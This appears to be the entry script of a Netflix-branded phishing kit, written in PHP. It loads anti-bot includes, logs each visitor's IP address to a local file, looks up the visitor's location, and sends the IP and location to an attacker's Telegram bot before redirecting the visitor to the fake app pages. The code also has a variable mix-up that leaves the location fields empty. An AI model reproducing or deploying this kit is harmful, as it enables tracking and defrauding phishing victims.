<?php
session_start();
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti7.php"; 
include "email.php";

$msg = "";   // Initialize first
$ip = getenv("REMOTE_ADDR");

$file = fopen("NetFlix_VISIT.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$country = $data->country ?? '';
$city = $data->city ?? '';
$region = $data->region ?? '';
$regionName = $data->regionName ?? '';
$zip = $data->zip ?? '';
$msg .= 
"[+] IP : " .$ip.
"\n[+] Country : ".$country.
"[+] City: " .$city.
"[+] Region : " .$region.
"[+] State: " .$regionName.
"[+] Zip : " .$zip;

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );
header("Location: app/");

?>


